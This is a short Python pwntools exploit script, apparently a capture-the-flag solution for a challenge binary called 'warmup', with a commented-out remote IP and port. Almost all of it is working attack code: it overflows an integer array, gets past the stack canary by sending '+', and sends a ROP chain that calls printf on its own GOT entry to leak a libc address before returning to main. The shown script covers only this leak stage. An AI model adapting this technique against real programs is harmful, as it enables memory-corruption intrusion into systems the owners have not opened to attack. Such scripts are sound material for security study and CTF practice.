#!/usr/bin/env python3
main_Addr = 0x401225
bypassCanary = b"+"
prdi_ret = 0x4013d3
printf_PLT = 0x401090
printf_GOT = 0x404020

from pwn import *

elf = ELF("./warmup")
libc = ELF("./libc.so.6")

p = elf.process()
# p = remote('45.122.249.68', '20001')
context.log_level = "DEBUG"
gdb.attach(p, gdbscript='''
	b *main+125
	b *main+215
''')
# canary 17 | rbp 18 | ret 19

def sendArr(number):	# int
	p.recvuntil(b"]: ")
	p.sendline(str(number).encode())
	return

# leak 
n = b"23"
p.recvuntil(b"n: ")
p.sendline(n)

for i in range(0, 17): 
	sendArr(i)

sendArr(bypassCanary)
sendArr(b'0')
sendArr(prdi_ret)
sendArr(int(printf_GOT))
sendArr(int(printf_PLT))
sendArr(int(main_Addr))


p.interactive()

